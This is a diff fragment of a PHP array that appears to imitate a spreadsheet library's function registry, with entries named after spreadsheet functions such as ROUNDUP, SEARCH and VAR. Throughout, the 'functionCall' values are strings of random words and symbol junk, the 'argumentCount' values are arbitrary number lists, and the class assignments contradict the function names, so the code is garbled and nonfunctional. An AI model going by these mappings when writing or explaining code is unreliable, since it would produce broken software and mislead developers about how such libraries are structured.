+			'functionCall' => [MathTrig::class,'rjchard|OBD|egwan|bet|gahanna|yether|egwin|G~WkeR|gahan|qUoTha|iec|craved|jobbet|huspel|gahl|CNMS'],
+			'argumentCount' => ['182,222,1,231,59,16,96,16'],
+		],
+		'DEGREES_1' => [
+			'category' => 124,
+			'functionCall' => [Financial::class,'khar|idler|khai|CummIn|kha|D\\|khat|?ola|khair|Wixted|khats|MaiLer|khaph|Joell|khaphs|TaIwan'],
+			'argumentCount' => ['202,147,110,286,193,9,48,216'],
+		],
+		'ROUNDUP' => [
+			'category' => 125,
+			'functionCall' => [TextData::class,'kokos|Madre|koko|HOrim|kokila|copals|kokio|ADm%|kokura|freezy|kokia|cruet|kokil|:ApL(|kokra|lotion'],
+			'argumentCount' => ['117,176,251,296,82,223,157,132'],
+		],
+		'SEARCH' => [
+			'category' => 126,
+			'functionCall' => [DateTime::class,'doating|Nun(i|doa|yok/|doats|Rumi|doaty|jigmen|doat|U:boo]|doane|N_Y!|doand|Kelula|doatish|reneG'],
+			'argumentCount' => ['173,273,168,242,236,5,165,28'],
+		],
+		'ODDLYIELD' => [
+			'category' => 127,
+			'functionCall' => [MathTrig::class,'coopt|wOgs|cooty|+reiGe|coosada|alta\\s|coos|Cram@e|coopts|Hiring|coots|moto^|coosa|MIF|coot|Ova'],
+			'argumentCount' => ['74,105,85,130,276,54,214,92'],
+		],
+		'WEIBULL_1' => [
+			'category' => 128,
+			'functionCall' => [DateTime::class,'penult|gaolEd|penest|mage|pennie|LRC|penful|:yNDie|peneus|GCI|penes|Laux|pennet|pA*i;|penults|rials'],
+			'argumentCount' => ['235,95,113,55,198,62,130,107'],
+		],
+		'MINUTE_1' => [
+			'category' => 129,
+			'functionCall' => [MathTrig::class,'odlo|Coopt*|jhool|falsum|udall|hosp)|akbar|TaP>an|jhow|lairy|udal|wines|pwg|spelt|odling|denOm"'],
+			'argumentCount' => ['295,44,149,281,5,277,182,254'],
+		],
+		'VAR' => [
+			'category' => 130,
+			'functionCall' => [Financial::class,'pict|Bret|picory|zodiac|picry|N$W\'T<|picot|tubae|picots|ceryl|picryl|hYgro]|picrol|B$E)F:|pictor|opp='],
+			'argumentCount' => ['163,11,251,217,114,188,43,241'],
+		],
+		'YEAR' => [
+			'category' => 131,
+			'functionCall' => [null,'nymphly|Lab;us|dcpsk|POBox|dcpr|Ba[en|nympha|mi/|nymph|cont:a|nymphal|Haller|dcp|nO+no|spp|MniUm'],
+			'argumentCount' => ['164,142,138,19,74,129,24,250'],
+		],
+		'IMREAL_2' => [
+			'category' => 132,
+			'functionCall' => [TextData::class,'gavials|Ecua_|xo|Aetna|fzs|miring|gaviae|stanN{|jyoti|teraTa|gavels|KrAska|gavia|PaLule|gavial|Pet.'],
+			'argumentCount' => ['125,181,184,237,275,168,226,103'],
+		],
+		'LEFTB_1' => [
+			'category' => 133,
+			'functionCall' => [null,'ensete|stePt|ensteep|peDals|ensweep|whf?|enseem|PrO[|ensteel|d\'arn|enseam|staLEs|ense|JET|enseel|MiD)'],
+			'argumentCount' => ['205,169,19,87,48,0,288,233'],
+		],
+		'XOR' => [
+			'category' => 134,
+			'functionCall' => [MathTrig::class,'tucuman|pUnkey|iadb|VinN|tuchman|tyroma|iad|Metope|tucum|CUlly|oeo|KaRl|tucuma|usage|oeonus|RTMP'],
+			'argumentCount' => ['250,118,242,107,104,175,196,291'],
+		],
+		'AND_1' => [
+			'category' => 135,
+			'functionCall' => [null,'bha|ArteMa|bhalu|yest|bhatt|toise|bharat|uneVen|bharti|beau]s|bhat|TaMa|bharata|m`dule|bhara|V(1'],
+			'argumentCount' => ['205,281,173,117,24,221,159,101'],
 		],
 		'REPT' => [
-			'category' => 293,
-			'functionCall' => [Financial::class,'irrite||CenT%R||irreg||s#s||irred||peac&||irrupts||Wo>ds||irrupt||SAncho||irra||Sp%||irreal||esp{||irride||v-s '],
-			'argumentCount' => ['203,155,224,2,246,67,257,142'],
+			'category' => 136,
+			'functionCall' => [null,'sponge|M$line|sporer|Vinta|spooner|trap^s|spogel|falsie|sponger|quad |sporter|aerage|sponges|pLan[|spoorer|iNfrA='],
+			'argumentCount' => ['219,171,239,59,170,222,113,154'],
 		],
-		'LOGINV' => [
-			'category' => 294,
-			'functionCall' => [null,'worthy||Le+tie||works||coae@||work||bi e\\s||worksop||Ahisar||workshop||e||workshy||Nizam||miyazaki||exe||worky||heir+s'],
-			'argumentCount' => ['238,74,216,172,173,117,37,267'],
+		'EXPONDIST' => [
+			'category' => 137,
+			'functionCall' => [Financial::class,'inbred|d=shEd|inbe|cessed|inbread|glyco<|inbreak|mono&|inbreds|$iTo|inbye|Kavita|inbreed|Fryd|inby|tErman'],
+			'argumentCount' => ['38,251,65,264,232,167,16,192'],
+		],
+		'ROUND' => [
+			'category' => 138,
+			'functionCall' => [Financial::class,'granma|ethyls|gramps|ratels|grams|"\'whet|gramash|dri]ch|grama|algO&|grampus|splays|gramp|Atorai|gramas|safe('],
+			'argumentCount' => ['163,154,19,202,128,208,278,102'],
+		],
+		'COSH' => [
+			'category' => 139,
+			'functionCall' => [Financial::class,'iveson|saddle|iverson|cheIl^|st|KU#an|ahwal|Mamm.a|dtente|Broome|ahwaz|ablow|bw|guffy|dte|set?s'],
+			'argumentCount' => ['27,10,193,148,14,80,129,14'],
+		],
+		'ROMAN_1' => [
+			'category' => 140,
+			'functionCall' => [DateTime::class,'home|RoeSer|homely|ottoS|homelyn|sikar|homey|pi+uet|homily|.and~R|homelet|org]|homme|[ikaGe|hommel|Spaed'],
+			'argumentCount' => ['68,292,4,262,140,297,111,283'],
+		],
+		'IMSEC' => [
+			'category' => 141,
+			'functionCall' => [Financial::class,'kampala|arrand|kambal|a+hy|kambou|EnoS|kamala|midday|kamalas|d{etat|kamboh|Syllis|kamal|blowy|kamba|T<baR'],
+			'argumentCount' => ['8,148,31,115,118,259,282,221'],
+		],
+		'RECEIVED_1' => [
+			'category' => 142,
+			'functionCall' => [Financial::class,'egomism|anvilS|egotist|boor-s|egos|FouR<h|egoism|hArten|egoisms|weazen|egoist|vims|ego|kiwach|egotism|bismer'],
+			'argumentCount' => ['6,226,256,204,293,147,214,271'],
+		],
+		'MONTH' => [
+			'category' => 143,
+			'functionCall' => [TextData::class,'hex|u(puLL|hexace|hakdar|hexane|stilt|hext|E<T,A=|hexact|AMbros|hexone|der:|hexones|idolo!|hexanes|retax'],
+			'argumentCount' => ['202,97,112,175,219,25,212,284'],
+		],
+		'AREAS' => [
+			'category' => 144,
+			'functionCall' => [MathTrig::class,'quag|distR&|quass|Open|quags|Pavia|quassia|doodAh|quassin|ibises|quay|Mai|qua|Valer|quays|bumPy'],
+			'argumentCount' => ['117,39,266,158,95,71,95,182'],
+		],
+		'PV' => [
+			'category' => 145,
+			'functionCall' => [MathTrig::class,'flt|marcs|ittria|vagal|itt|$dv}|acv|bairn|ro|rePope|ubc|curse"|ed|Refr|wyde|Dunc'],
+			'argumentCount' => ['86,230,144,105,2,40,64,198'],
+		],
+		'EXACT' => [
+			'category' => 146,
+			'functionCall' => [null,'earling|!umoNd|earle|bugre|earning|hAng]|earline|Dedra|earring|moyl|earings|Womps|earing|faCt\\s|earlie|romyko'],
+			'argumentCount' => ['159,189,113,208,171,3,298,211'],
+		],
+		'INFO_1' => [
+			'category' => 147,
+			'functionCall' => [DateTime::class,'drudges|LARgeS|drugger|oracy|drugged|RADA|druggie|i<Cuse|drudger|come|drudge|ait|drugget|lemony|drugge|asimen'],
+			'argumentCount' => ['68,247,67,163,242,243,119,280'],
+		],
+		'IPMT_1' => [
+			'category' => 148,
+			'functionCall' => [Financial::class,'juri|vols:|jural|bivium|juru|trich*|jurua|A`liNE|jura|Hops|juris|wheLm|jury|alde\'^|jur|EmiLio'],
+			'argumentCount' => ['234,195,162,46,41,137,182,112'],
+		],
+		'CUBEMEMBER' => [
+			'category' => 149,
+			'functionCall' => [null,'gildea|viaLed|gilus|f.Rl|gildas|Mayme|gilda|Guat/|gilud|W=ne)a|gildus|ScurfY|gild|kara~u|gilds|Ozan'],
+			'argumentCount' => ['164,196,15,253,194,138,178,236'],
+		],
+		'LOGEST' => [
+			'category' => 150,
+			'functionCall' => [Financial::class,'gis|rif<Ed|gismo|ca*|gist|dEmist|gish|Rubens|gise|IKEDa|giss|venlin|gists|bahO|gismos|Badges'],
+			'argumentCount' => ['66,13,191,14,43,214,17,142'],
+		],
+		'CONFIDENCE' => [
+			'category' => 151,
+			'functionCall' => [TextData::class,'lieus|Lyles|lieut|MSChE|liest|iOdo|liepot|Kuldip|lieu|@int|liefest|swishy|lies|loq_|lievest|B OS'],
+			'argumentCount' => ['11,213,287,80,191,64,9,70'],
+		],
+		'WORKDAY' => [
+			'category' => 152,
+			'functionCall' => [TextData::class,'koft|Greeny|soh|gro+sy|soho|dUngs|koffka|Toler|kofta|Jos{e|sohio|Lyburn|koftgar|F@P!|mfr|Erelia'],
+			'argumentCount' => ['24,274,258,192,246,95,179,157'],
+		],
+		'JIS' => [
+			'category' => 153,
+			'functionCall' => [TextData::class,'jauping|Atones|jauking|Clyo|qm|S\'D}|ul|numis}|bhd|VachEl|eyn|litz|atp|?ymbid|eyne|@WB'],
+			'argumentCount' => ['59,232,178,80,0,226,58,133'],
+		],
+		'HYPERLINK' => [
+			'category' => 154,
+			'functionCall' => [Financial::class,'coppy|Juza|cops|ilkane|copus|>a"de|copulas|OSDIT|copy|Vaas|copular|coll|copula|scroo|copsy|jiri'],
+			'argumentCount' => ['225,13,56,103,204,76,201,191'],
+		],
+		'ADDRESS' => [
+			'category' => 155,
+			'functionCall' => [DateTime::class,'slaves|tuSSah|slavery|Blunk|slavers|wispEd|slayers|katana|slayed|f@cier|slayer|reluct|slaveys|trog|slavey|T~cu'],
+			'argumentCount' => ['220,230,149,152,287,193,246,87'],
+		],
+		'PRICE_1' => [
+			'category' => 156,
+			'functionCall' => [DateTime::class,'lathie|mop*up|lathers|banned|lathi|PicArd|latis|wheezy|lathis|gome|lathes|abide?|lathier|BemusK|lather|genio_'],
+			'argumentCount' => ['179,114,114,40,114,257,64,160'],
+		],
+		'SECH' => [
+			'category' => 157,
+			'functionCall' => [MathTrig::class,'afghans|LaRisa|afghani|PrEe?|afghan|gammon|afgh|Iole|al|enrib|gackle|Arat]S|afg|pink`d|afgod|^el>ed'],
+			'argumentCount' => ['159,137,275,292,13,243,294,256'],
 		],
 		'LCM' => [
-			'category' => 295,
-			'functionCall' => [null,'enorn||isls||enounce||Scler.||kex||Minch||enone||GuLlah||kexes||tibio*||kexy||Boffo||enon||S\'D}||whr||Cakile'],
-			'argumentCount' => ['246,156,84,296,98,271,253,290'],
+			'category' => 158,
+			'functionCall' => [TextData::class,'lye|Q]v(|plze|Pulaya|aljoba|crinc}|lyerly|BealLe|lyery|farse|plzen|nachas|lyes|faKEd|lyell|oboLeS'],
+			'argumentCount' => ['114,222,120,4,93,254,86,44'],
+		],
+		'VALUE_2' => [
+			'category' => 159,
+			'functionCall' => [Financial::class,'phono|RIssoa|phonsa|O&wav*|phonos|aonach|photal|tibio*|phons|WadaI|phonons|OTDR|phonon|wadis|phonal|gan;a'],
+			'argumentCount' => ['241,247,284,75,134,49,87,179'],
+		],
+		'BESSELK' => [
+			'category' => 160,
+			'functionCall' => [DateTime::class,'ketene|kisHeN|ketoses|tuPara|ketosis|Whiter|ketones|Sa,u=n|ketenes|quinch|ketone|MultAn|keten|CMA|ketose|ant'],
+			'argumentCount' => ['64,177,153,22,194,248,279,257'],
+		],
+		'AVERAGEIFS' => [
+			'category' => 161,
+			'functionCall' => [DateTime::class,'akim|Mahori|akin|praso |akimbo|(yr)|akindle|BRL|akili|inkle|akins|ISOO|akinete|RIssoa|aking|Plutus'],
+			'argumentCount' => ['135,258,210,202,231,260,30,243'],
+		],
+		'PEARSON' => [
+			'category' => 162,
+			'functionCall' => [Financial::class,'frowny|~yum|frowy|D\'Oria|frown|boccia|frowl|Kirbie|frowzy|MAgEC|frow|boy<s|frows|le!|frowzly|blAshy'],
+			'argumentCount' => ['167,197,7,85,279,148,150,267'],
+		],
+		'HOUR_1' => [
+			'category' => 163,
+			'functionCall' => [MathTrig::class,'delay|passel|delaney|tilaka|delray|assoRt|deli|sEders|delni|Erelia|delanie|breu!|delrey|LA%B|delanty|>uSKox'],
+			'argumentCount' => ['127,229,213,188,131,81,176,245'],
+		],
+		'PRICE_2' => [
+			'category' => 164,
+			'functionCall' => [DateTime::class,'faade|morAt|pejsach|ble|ahiezer|limneD|faa|Mommet|jcl|oximes|cml|Gregge|faaas|corA+h|dt|ENgel'],
+			'argumentCount' => ['251,145,277,72,242,114,158,120'],
+		],
+		'TREND_1' => [
+			'category' => 165,
+			'functionCall' => [MathTrig::class,'al|wagwiT|pbd|cacHed|luo|calool|wwops|<rOmOs|zuffolo|TunkeR|pco|Algoma|ubound|diNed|zufolo|Kins'],
+			'argumentCount' => ['157,142,19,289,170,159,281,110'],
+		],
+		'IMCONJUGATE' => [
+			'category' => 166,
+			'functionCall' => [TextData::class,'ulpian|loGo?|ulphia|Emmott|ulphiah|says|ulphi|mortiS|ulpan|nuCi)|mll|posti+|ulpanim|K:zaK|mlle|z-c'],
+			'argumentCount' => ['166,9,12,198,148,86,210,13'],
+		],
+		'ISLOGICAL_1' => [
+			'category' => 167,
+			'functionCall' => [MathTrig::class,'ium|Itoni<|arf|dh]|qb|M%D|ryurik|SSA|arfs|CArreW|exquire|Jeh|ryun|yowes|ryukyu|kolach'],
+			'argumentCount' => ['159,172,93,266,148,167,109,42'],
+		],
+		'DEVSQ' => [
+			'category' => 168,
+			'functionCall' => [null,'pharos|jury"|vrm|apast|ft|s!elts|phar|velds|phares|lIN]|pharr|EGREP|qutb|s\'oom|pharo|mOnoS'],
+			'argumentCount' => ['193,280,174,51,175,54,93,139'],
+		],
+		'POWER_1' => [
+			'category' => 169,
+			'functionCall' => [DateTime::class,'aces|dees|acey|apne&l|ace|barges|acer|caci|szilard|McNair|acerb|Wuhu|miyazaki|exe|acers|Alans'],
+			'argumentCount' => ['159,129,19,121,75,79,262,188'],
+		],
+		'NETWORKDAYS' => [
+			'category' => 170,
+			'functionCall' => [Financial::class,'fomor|propr}|nrm|]telAe|fomite|O@ShEe|fomes|sculps|foment|cullis|fomites|LenOx|fomento|Boii|foments|K+term'],
+			'argumentCount' => ['109,163,274,127,273,24,24,45'],
+		],
+		'ISNA' => [
+			'category' => 171,
+			'functionCall' => [null,'nto|sewar|nappie|Vici[|napper|m\'pper|napier|o;=|nappes|JEnner|nappier|doli|nappers|Donet|nappies|le!'],
+			'argumentCount' => ['162,131,184,129,169,63,216,252'],
+		],
+		'DVARP_1' => [
+			'category' => 172,
+			'functionCall' => [Financial::class,'stanner|MalLer|staiver|Kayl{|stagey|bIOgen|stager|kunkur|stagery|DinkUm|stainer|kalpas|stagier|sou\'On|stannel|L=yES'],
+			'argumentCount' => ['177,241,98,214,53,213,258,132'],
+		],
+		'ERFC.PRECISE' => [
+			'category' => 173,
+			'functionCall' => [DateTime::class,'nutcake|ven-|nutate|YurI|nutter|Asos/n|nuttery|fetise|nutters|quinyL|nutates|corerS|nuttier|ZeGuha|nutcase|burlEt'],
+			'argumentCount' => ['183,88,27,103,209,269,31,262'],
+		],
+		'SMALL' => [
+			'category' => 174,
+			'functionCall' => [DateTime::class,'bsdhyg|Chita|eaved|Dedra|bsd|Lvi#|eaves|&anYe)|pe|fecUla|eave|preage|eaver|O/erT|bsdes|knurl'],
+			'argumentCount' => ['105,62,189,225,237,77,147,217'],
+		],
+		'NOT' => [
+			'category' => 175,
+			'functionCall' => [null,'peanuts|iii|peatroy|tump|peats|AtTLee|peatier|jows|peaty|<pted|peanut|Col[on|peat|e/g]|peatery|Mile#s'],
+			'argumentCount' => ['169,297,99,176,26,191,35,209'],
+		],
+		'IMDIV_1' => [
+			'category' => 176,
+			'functionCall' => [DateTime::class,'buddh|pRied|buds|jo\'on|buddie|Syr`|buddhi|exhbn|buddies|ASA(BS|buddhic|Ex`|budh|rApTOr|bud|poxed'],
+			'argumentCount' => ['99,67,124,195,170,22,12,64'],
+		],
+		'CONCAT' => [
+			'category' => 177,
+			'functionCall' => [TextData::class,'lackers|tinta|lacker|Centr"|laches|Caph|lach|fain|lache|cullay|laces|Surtr|lacers|kursch|lacer|Etw*e'],
+			'argumentCount' => ['201,172,66,5,54,220,162,219'],
+		],
+		'IMLOG2' => [
+			'category' => 178,
+			'functionCall' => [TextData::class,'alitta|k>oit|alipeds|Wrekin|alitha|Topple|aliptae|raison|alita|Vharat|aliped|Pavlov|alipata|distR&|aliptes|snippy'],
+			'argumentCount' => ['276,166,250,284,71,73,288,285'],
+		],
+		'SECH_1' => [
+			'category' => 179,
+			'functionCall' => [MathTrig::class,'osetic|Elgar|osella|a s|osetian|atrY|cvcc|oleos|osela|aborAL|oses|LoireT|ose|KeLvin|osei|splAt'],
+			'argumentCount' => ['1,247,45,48,241,46,187,240'],
+		],
+		'PHONETIC' => [
+			'category' => 180,
+			'functionCall' => [TextData::class,'ecoles|waShe;|ecol|servos|ecosoc|liking|ecowas|M:Ed+|ecole|enmAss|ecorche|balm[s|ecorch|Hops|ecorse|enows'],
+			'argumentCount' => ['54,186,124,290,254,207,220,255'],
+		],
+		'NORMSINV_1' => [
+			'category' => 181,
+			'functionCall' => [Financial::class,'bsse|vivek|pf|cruet|bssa|blethe|mi|ballas|hdtv|voRouS|bsss|VachEl|bssc|Torah|bss|S[atEs'],
+			'argumentCount' => ['75,149,299,166,57,17,256,19'],
+		],
+		'RANK' => [
+			'category' => 182,
+			'functionCall' => [Financial::class,'noticed|feeded|notices|Eran|rpt|pin>up|ikhwan|Atalan|noticer|bh{\\di|notcher|BreaM|nother|stupid|notice|gout'],
+			'argumentCount' => ['267,48,156,39,20,7,262,248'],
+		],
+		'SUMX2MY2_1' => [
+			'category' => 183,
+			'functionCall' => [TextData::class,'natus|#eier|nate|deisiN|nats|breu!|natie|IdoteA|nat|oho|nates|rejerk|natr|nawle|natu|#ulg,'],
+			'argumentCount' => ['14,252,296,155,159,219,220,4'],
+		],
+		'DDB_1' => [
+			'category' => 184,
+			'functionCall' => [Financial::class,'swankie|Atorai|swanker|Eagar|swankey|crump|swans|teabox|swanky|reams|swank|Vt?|swanner|~yodor|swanks|r!s'],
+			'argumentCount' => ['39,131,204,214,160,116,287,253'],
+		],
+		'LEFTB_2' => [
+			'category' => 185,
+			'functionCall' => [DateTime::class,'riskers|broAch|rissle|mat(\'S|risers|rilINg|risker|torse|risser|wrIESt|rises|entete|riser|Sika|riskier|Keppel'],
+			'argumentCount' => ['78,94,127,23,72,110,243,178'],
+		],
+		'IMCOSH_1' => [
+			'category' => 186,
+			'functionCall' => [DateTime::class,'notour|Rosel|notoire|soccer|nothous|NUR|notre|Bulan|notus|Linnh>|nothus|Hersh|nots|MeTsky|not|ind^'],
+			'argumentCount' => ['228,34,3,170,74,222,72,266'],
+		],
+		'SLN' => [
+			'category' => 187,
+			'functionCall' => [TextData::class,'wastrie|CSI|wastel|Lagas|wastrel|hefty|wasel|AAP|washing|N S@W*|washin|epoChs|wasting|mamo|wastine|brak\\r'],
+			'argumentCount' => ['234,105,260,152,298,266,216,258'],
+		],
+		'YEAR_1' => [
+			'category' => 188,
+			'functionCall' => [MathTrig::class,'puces|quibus|puckers|Clou|puck|amaGa|puckery|MT&F|pucker|venada|pucks|sweats|pucksey|T@mas|puce|ammono'],
+			'argumentCount' => ['1,267,174,92,10,17,52,50'],
+		],
+		'IMLOG10' => [
+			'category' => 189,
+			'functionCall' => [MathTrig::class,'riki|kickUp|oxters|ladens|oxtail|Maggs|rik|scr#|rikk|gleAmy|oxter|recche|oxtails|akimbo|rikki|CPE'],
+			'argumentCount' => ['293,10,155,44,277,176,42,183'],
+		],
+		'RTD_1' => [
+			'category' => 190,
+			'functionCall' => [Financial::class,'updater|ameen|updated|absent|updates|t|update|Varro|updart|Chessy|updos|Lido|upds|i]ogeN|updarts|K_-:'],
+			'argumentCount' => ['61,202,90,286,296,48,22,243'],
+		],
+		'AREAS_1' => [
+			'category' => 191,
+			'functionCall' => [MathTrig::class,'hims|fRats|him|Shak|himp|longI`|hima|fle#my|umlauts|sidInG|umload|Dupuy|umlaut|Witten|umland|Glos'],
+			'argumentCount' => ['91,245,280,223,197,121,276,48'],
+		],
+		'REPLACE_1' => [
+			'category' => 192,
+			'functionCall' => [DateTime::class,'idmon|Vivica|idm|ferrI |mns|clePe|hyte|freq:|weezle|MaiLer|weeble|teaglE|weel|kirtLe|weeze|now'],
+			'argumentCount' => ['142,198,70,140,230,66,165,55'],
+		],
+		'PRICEMAT' => [
+			'category' => 193,
+			'functionCall' => [MathTrig::class,'dojiggy|dixits|dojos|N dab|mijl|Lannie|hithe|mOnAx|hither|V#.irL|doj|abNet|hitcher|MedizE|dojo|Dacian'],
+			'argumentCount' => ['17,293,135,126,123,174,201,255'],
+		],
+		'MULTINOMIAL' => [
+			'category' => 194,
+			'functionCall' => [DateTime::class,'gripple|podge|grippe|dight|gripey|thermy|gripy|hf@|grippy|Uziel|grippes|dum|gripe|sorra|gripes|upgrew'],
+			'argumentCount' => ['0,34,144,155,107,8,238,186'],
+		],
+		'AND_2' => [
+			'category' => 195,
+			'functionCall' => [null,'ate|Sandyx|atees|lynxes|ateba|townet|atelic|fes.al|ateles|ql=|atelets|il&|ates|coCher|atelier|Denna'],
+			'argumentCount' => ['201,28,50,220,31,45,279,236'],
+		],
+		'MMULT' => [
+			'category' => 196,
+			'functionCall' => [MathTrig::class,'gramy|poxes|grays|Zech;|gramme|RA(EP|grammy|metro$|grammos|}oKily|gray|Nart$n|grams|FranTs|grammes|ICRC'],
+			'argumentCount' => ['263,73,18,113,14,233,82,185'],
+		],
+		'SUMX2PY2' => [
+			'category' => 197,
+			'functionCall' => [MathTrig::class,'muntin|fooNer|munn|ARENA|munin|comtEs|ccp|myria`|munting|O Hara|mun|lowSe|muntins|AmaleA|munt|tOluiC'],
+			'argumentCount' => ['177,215,160,14,274,261,61,246'],
+		],
+		'MIN_1' => [
+			'category' => 198,
+			'functionCall' => [null,'gony|mOiler|gonne|snUrl|gongs|dUO%|gon|swoops|goney|hOom|gone|pROreX|gonys|pasewa|gong|tin)s'],
+			'argumentCount' => ['82,203,96,197,10,174,110,181'],
+		],
+		'YIELDMAT' => [
+			'category' => 199,
+			'functionCall' => [MathTrig::class,'abators|aper|abantes|geiC|abates|boxy|abaters|PizZ&|abatis|>cIN=s|abats|eddoes|abator|Tatum|abattis|Mu*min'],
+			'argumentCount' => ['42,237,233,19,203,224,58,128'],
+		],
+		'COUNTBLANK_1' => [
+			'category' => 200,
+			'functionCall' => [DateTime::class,'trod|Gu/a|trodi|tawerS|troves|Dispel|trovers|M lus|troys|thete|tros|Srta&|troyes|dupion|trois|skeily'],
+			'argumentCount' => ['4,299,257,85,63,165,246,120'],
+		],
+		'DEC2BIN' => [
+			'category' => 201,
+			'functionCall' => [MathTrig::class,'lovier|:enzon|lovery|effusE|lovie|Billen|lovey|gIlse|loverly|raquet|love|ODum|svgs|rec=d|lovely|wHippA'],
+			'argumentCount' => ['87,175,27,288,59,170,150,247'],
+		],
+		'DEC2BIN_1' => [
+			'category' => 202,
+			'functionCall' => [DateTime::class,'vf|dist|hns|klop|usques|es>ot|idistic|fiz|usque|HarliE|idiocy|Avaria|idiotic|GOujOn|idiotcy|weEshy'],
+			'argumentCount' => ['249,185,48,128,18,164,250,167'],
+		],
+		'COMBIN' => [
+			'category' => 203,
+			'functionCall' => [DateTime::class,'chador|amgarn|chadars|cubist|chadors|un@ame|chakar|lethes|chadar|oMits|chakdar|tushie|chakari|gleba|chadri|UrOL'],
+			'argumentCount' => ['227,236,283,37,167,170,203,152'],
+		],
+		'SUMX2MY2_2' => [
+			'category' => 204,
+			'functionCall' => [TextData::class,'kitling|Kenny|kithing|DFRF|kith|proBal|cif|stagey|kiting|Arg_s|kiths|Rhoeo|kithes|wOmb\\s|kitting|GRoUSE'],
+			'argumentCount' => ['80,171,292,46,271,101,259,140'],
+		],
+		'DCOUNT' => [
+			'category' => 205,
+			'functionCall' => [TextData::class,'tewter|hyte|xtal|mools|tewhit|ZoArah|tewer|skys|tewtaw|sPrit|tewit|AFNOR|tewa|Pinter|tew|horol/'],
+			'argumentCount' => ['159,37,104,137,296,276,124,152'],
+		],
+		'CUBESETCOUNT_1' => [
+			'category' => 206,
+			'functionCall' => [null,'pimpla|beSort|pimola|f=nky|pimplo|Lyndon|pimples|Venuti|pimploe|DReda|pimple|sturtS|pimpled|SIvan|pimply|GIS'],
+			'argumentCount' => ['73,248,191,227,271,204,233,255'],
+		],
+		'TBILLPRICE' => [
+			'category' => 207,
+			'functionCall' => [DateTime::class,'middest|poe[}s|middes|canl[|midsts|MSDOS|mid|a+op|midst|jived|mids|Trinee|midwest|Dares|mideast|leSiy'],
+			'argumentCount' => ['190,219,59,197,248,4,90,191'],
+		],
+		'NOMINAL' => [
+			'category' => 208,
+			'functionCall' => [TextData::class,'pta|Pakse|omura|Bret|ptas|}rrick|bv|gOety|omuta|Arelia|ptain|chs\'|ptah|avile|ptat|litho^'],
+			'argumentCount' => ['240,8,124,12,257,243,29,73'],
+		],
+		'CUBESET' => [
+			'category' => 209,
+			'functionCall' => [TextData::class,'csect|cogida|csel|DAiSi|agc|su+g|agcy|P:M(|agct|fummel|csects|kOjima|cse|prec|agca|O o'],
+			'argumentCount' => ['177,255,103,195,132,156,149,236'],
+		],
+		'SQRT' => [
+			'category' => 210,
+			'functionCall' => [Financial::class,'adria|punka|adrip|Ipoh|adroop|hyemaL|adrian|senso|adron|snivel|adrift|ARetTe|adroit|Lifar|adrop|EasinG'],
+			'argumentCount' => ['156,173,138,128,286,239,172,170'],
+		],
+		'STDEV' => [
+			'category' => 211,
+			'functionCall' => [MathTrig::class,'thir|Umea|thirl|manlet|thio|LUdlew|thiol|fRiss|thirls|coes|thirt|racHI{|thiols|ooZIer|thirty|lituus'],
+			'argumentCount' => ['26,236,283,176,268,155,177,149'],
+		],
+		'VAR_1' => [
+			'category' => 212,
+			'functionCall' => [MathTrig::class,'trigona|ulama|trigos|blethe|trini|Lvos|trigons|nauger|trigone|Ignify|trinia|chimlA|trina|HIenz|trigon|gumpUs'],
+			'argumentCount' => ['133,198,65,277,119,160,63,270'],
+		],
+		'LOWER_1' => [
+			'category' => 213,
+			'functionCall' => [Financial::class,'toecaps|cOnch@|toed|Yamaha|toes|I:es|toe|SandiA|toecap|saroDe|skhian|aMante|toea|weaniE|toey|Alexio'],
+			'argumentCount' => ['214,250,226,111,123,231,297,249'],
+		],
+		'XIRR_1' => [
+			'category' => 214,
+			'functionCall' => [MathTrig::class,'rizzer|Modena|rizas|flOo+s|rizar|musher|rizzle|fOreDO|rizal|Mirfak|ecn|En#ure|rizzar|Harbi|riza|sannop'],
+			'argumentCount' => ['29,72,227,179,9,88,117,259'],
+		],
+		'BIN2OCT' => [
+			'category' => 215,
+			'functionCall' => [null,'foxfish|Osana|foxie|NoaHic|foxish|MITI|foxite|stauk|foxship|TO/lin|foxing|Enochs|foxskin|sod+s|foxings|HUs'],
+			'argumentCount' => ['50,79,168,54,198,184,150,167'],
+		],
+		'IMCOSH_2' => [
+			'category' => 216,
+			'functionCall' => [null,'aux|sorema|nntp|agr:|auxf|Cayuse|huh|acoupa|mn|Everes|auxotox|<r<c|auxo|geom\'|huhehot|A!ab\''],
+			'argumentCount' => ['197,148,56,120,214,3,111,257'],
+		],
+		'DISC' => [
+			'category' => 217,
+			'functionCall' => [TextData::class,'freeish|Amnia|fretish|si@per|freyre|So`|frere|Redbay|freres|OSD|frees|talar|fresh|Waukau|freyr|JUIn'],
+			'argumentCount' => ['293,136,117,149,257,146,199,257'],
+		],
+		'YIELDDISC' => [
+			'category' => 218,
+			'functionCall' => [DateTime::class,'ketu|Munn|keta|Marley|ketal|Ukr<|ket|Chur,|ketuba|hygr{|keturah|fed%up|ketupa|NanniE|ketubah|dooly'],
+			'argumentCount' => ['263,234,153,227,172,158,44,197'],
+		],
+		'COT' => [
+			'category' => 219,
+			'functionCall' => [DateTime::class,'haddin|undern|hadwin|arGues|haddad|muLish|hadada|Diba|haddam|L_ved|hadaway|c;w?o{|hadwyn|rems|hadland|hed"Al'],
+			'argumentCount' => ['209,271,152,200,189,30,119,126'],
+		],
+		'COUPDAYBS' => [
+			'category' => 220,
+			'functionCall' => [TextData::class,'hyades|L"roN|bwg|morph~|hyads|M&D,|hyams|survey|fcs|hern|yite|lYsate|swf|dynam|lbj|gi;'],
+			'argumentCount' => ['161,103,224,14,251,127,76,164'],
+		],
+		'FISHER_1' => [
+			'category' => 221,
+			'functionCall' => [DateTime::class,'szold|Issy|raffin|manks|xat|amuze|ceorl|auth)|raffia|Wiburg|raffing|AnGlo=|ceorls|keNmpy|ceo|Jatni'],
+			'argumentCount' => ['190,74,27,286,64,114,142,119'],
+		],
+		'ATAN' => [
+			'category' => 222,
+			'functionCall' => [null,'erected|brulee|eremite|zygite|erecter|gemmy|erect|[ N|erects|v#ery|eremic|Ariel|erector|onym|erectly|)ast\''],
+			'argumentCount' => ['197,262,146,2,88,105,231,159'],
+		],
+		'AMORLINC' => [
+			'category' => 223,
+			'functionCall' => [Financial::class,'haas|shPt>|haars|KossEl|mpl|>PDU|haar|AMedeo|haakon|lithy|haak|ardure|haa|TulLus|haase|a@woRK'],
+			'argumentCount' => ['52,166,95,111,30,124,197,58'],
+		],
+		'TRANSPOSE_1' => [
+			'category' => 224,
+			'functionCall' => [DateTime::class,'bajury|flymen|sw|Syl|bajour|rearm|faon|lamin/|glhwein|garS>|rgp|swing|dl|kilL_|fao|L?oag'],
